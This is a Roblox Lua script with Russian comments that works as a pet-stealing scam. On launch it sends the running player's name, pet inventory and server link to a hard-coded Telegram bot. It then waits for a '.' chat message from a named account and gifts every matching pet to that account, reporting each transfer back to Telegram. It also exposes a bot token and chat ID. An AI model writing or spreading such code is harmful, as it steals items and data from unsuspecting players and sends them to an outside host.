local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "Rikizigg"
local TRIGGER_MESSAGE = "."

-- 🐾 ТОЧНЫЕ НАЗВАНИЯ ПИТОМЦЕВ (без дополнительных параметров)
local PET_NAMES = {
    "Hamster",
}

-- 🔎 Фильтрация ТОЛЬКО питомцев
local function getTruePets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            -- Проверяем ЧИСТОЕ название (первое слово до пробела)
            local baseName = item.Name:match("^([^%[]+)") or item.Name
            baseName = baseName:gsub("%s+$", "")
            
            -- Проверяем формат веса/возраста
            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            
            -- Если есть совпадение и параметры
            if table.find(PET_NAMES, baseName) and weight and age then
                table.insert(pets, {
                    name = baseName,
                    fullName = item.Name,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    object = item
                })
            end
        end
    end
    
    return pets
end

-- 📜 Формирование списка питомцев
local function getCleanPetsList()
    local pets = getTruePets()
    if #pets == 0 then return "нет питомцев" end
    
    local list = {}
    for _, pet in ipairs(pets) do
        table.insert(list, string.format("%s [%.2f кг, %d дн.]", pet.name, pet.weight, pet.age))
    end
    
    return table.concat(list, "\n")
end

-- ✋ Взять в руку
local function equipPet(pet)
    if pet and player.Character then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(1)
    end
end

-- 📤 Передать питомца
local function transferPet(pet)
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target and ReplicatedStorage:FindFirstChild("PetGiftingService") then
        ReplicatedStorage.PetGiftingService:FireServer("GivePet", target)
        return true
    end
    return false
end

-- 📨 Отправка в Telegram
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage"..
               "?chat_id="..TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(text)
    pcall(function() game:HttpGet(url) end)
end

-- 🚀 Основная функция передачи
local function startPetTransfer()
    local pets = getTruePets()
    if #pets == 0 then
        sendToTelegram("❌ Нет подходящих питомцев")
        return
    end
    
    for _, pet in ipairs(pets) do
        equipPet(pet.object)
        if transferPet(pet.object) then
            sendToTelegram("✅ "..pet.name.." [передан]")
        else
            sendToTelegram("❌ "..pet.name.." [ошибка]")
        end
        task.wait(2)
    end
end

-- 🔗 Получить ссылку на сервер
local function getServerLink()
    return "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
end

-- 🏁 ИНИЦИАЛИЗАЦИЯ
sendToTelegram(
    "🔔 "..player.Name.." активировал скрипт\n"..
    "🐾 Питомцы:\n"..getCleanPetsList().."\n"..
    "🔗 "..getServerLink()
)

-- 👂 Слушатель чата
game.Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        startPetTransfer()
    end
end)
